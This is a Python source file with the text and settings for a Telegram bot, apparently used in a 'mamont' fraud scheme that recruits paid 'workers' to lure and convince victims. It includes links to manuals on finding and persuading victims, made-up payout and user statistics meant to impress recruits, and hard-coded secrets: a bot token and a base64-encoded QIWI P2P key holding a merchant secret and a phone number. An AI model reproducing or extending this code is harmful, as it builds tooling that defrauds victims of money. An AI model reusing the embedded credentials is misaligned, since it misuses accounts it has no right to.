import telebot

main_token = '1750458018:AAFGXF3z2BawdycSVNhghgM4y92bDRtrmF8'
BOT_NAME = "QIWIHANDLERROBOT"

P2P_COMMENT = "Оплата доступа к панели"
WORKER_ACCESS = 250

SECRET_P2P = "eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6InpvejhkdS0wMCIsInVzZXJfaWQiOiI3OTYxNzg0MTY0NyIsInNlY3JldCI6IjQ2MmIzOTBhMzA4Y2IxYmZiMmNlOWM2NjI1MGZmMTliMWIwNzNmOTJhYjYwOGNiNmFjODZhY2IyZjRiZThlZTkifX0="
PUBLIC_P2P = "48e7qUxn9T7RyYE1MVZswX1FRSbE6iyCj2gCRwwF3Dnh5XrasNTx3BGPiMsyXQFNKQhvukniQG8RTVhYm3iPzNKUdLfaCGLSoRGrJ6Qij7Udr6Bmgis6AwX6t6WQT1LG8WP71oH6RwbsaEHVzqhDfnpHD9P8o71gwGX2jRdyZXGbDGuaud79s6fSmWFVg"

admins = [1347410943, 1546182461]

bot = telebot.TeleBot(main_token, threaded=True, num_threads=300)

manual_1 = "https://telegra.ph/Kak-snyat-dengi-tmeQIWIDENIGU-ROBOT-03-21"
manual_2 = "https://telegra.ph/Gde-najti-mamonta-03-21"
manual_3 = "https://telegra.ph/BEZOPASNOST-NASHE-VSE-03-21"
manual_4 = "https://telegra.ph/Kak-ubedit-mamonta-03-21"

phone_regex = "^[7|8|380](\d{10,11})$"

def worker_p2p_text():
	text = \
	"<b>После оплаты вы получаете\n"\
	"+ Личный киви манипулятор 🥝\n"\
	"+ Чат воркеров 💬\n"\
	"+ Уникальную сыллку для приглашений мамонтов 🦣\n" \
	"+ Мануалы по поиску и безопасности 📚\n"\
	"+ Дружный коллектив и хорошую атмосферу🎉\n"\
	"+ Как убедить мамонта в работе бота🤖\n\n"\
	"Оплатить доступ BTC ЧЕКОМ  https://t.me/admricker</b>"
	return text

def statistics_text():
	text = \
	"<b>ВЫПЛАЧЕНО БОЛЕЕ 270000₽ 🤑\n\n"\
	"Участников в боте: 29000👥</b>\n"

	return text

def profile_text(user_id):
	text = \
	f"<b>👤 Профиль: {user_id}\n\n"\
	"💰 Баланс: 0 руб.\n"\
	"❌ Вы не зарегистрированы\n"\
	"📆 Заработно за все время: 0 руб.\n\n"\
	"💳 Вывод средств будет доступен как только баланс станет выше 1 руб.</b>"

	return text

def worker_manuals_text():
	text = \
	f"Как снять деньги с киви 🥝 <a href='{manual_1}'>ТЫК</a>\n\n"\
	f"Как найти мамонта 🦣 <a href='{manual_2}'>ТЫК</a>\n\n"\
	f"Безопасность наше все 🔥 <a href='{manual_3}'>ТЫК</a>\n\n"\
	f"Как убедить мамонта 🎆 <a href='{manual_4}'>ТЫК</a>\n\n"

	return text

def worker_add_mamont_text(worker_id):
	text = \
	"<b>Для получения данных мамонта необходимо чтобы он зарегестрировался в боте по вашей ссылке ⬇️\n"\
	f"<code>https://t.me/{BOT_NAME}?start={worker_id}</code></b>"

	return text